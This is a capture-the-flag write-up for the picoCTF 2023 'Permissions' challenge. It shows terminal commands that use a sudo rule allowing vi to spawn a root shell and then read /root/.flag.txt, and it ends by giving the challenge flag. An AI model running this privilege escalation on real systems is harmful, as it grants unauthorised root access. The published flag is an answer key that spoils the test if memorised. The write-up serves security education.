# Write Up for Web Exploit challenge for PICO CTF 2K23 - Permissions

> Pratyush Prakhar (5#1NC#4N) - 11/11/2023

## Description

Can you read files in the root file?

## Solution

All about the access we have. Common to use the `find` function to find useful binaries, files, dir that we own, can run or can use to escalate. found nothing good that way. Other common thing is to check `sudo -l` for all the things we can run as sudo. We got our way in like that through `vi` binary.
Check [here](https://gtfobins.github.io/gtfobins/vi/#sudo) for exploit.

```bash
picoplayer@challenge:~$ ls -la
total 12
drwxr-xr-x 1 picoplayer picoplayer   20 Nov 13 10:32 .
drwxr-xr-x 1 root       root         24 Aug  4 21:32 ..
-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer   34 Nov 13 10:32 .cache
-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo /usr/bin/vi -c ':!/bin/bash' /dev/null

root@challenge:/home/picoplayer# cd /root/.
./         ../        .bashrc    .flag.txt  .profile   
root@challenge:/home/picoplayer# cd /root/
root@challenge:~# cat  .flag.txt 
picoCTF{******************************}
```

## FLAG

picoCTF{uS1ng_v1m_3dit0r_f6ad392b}
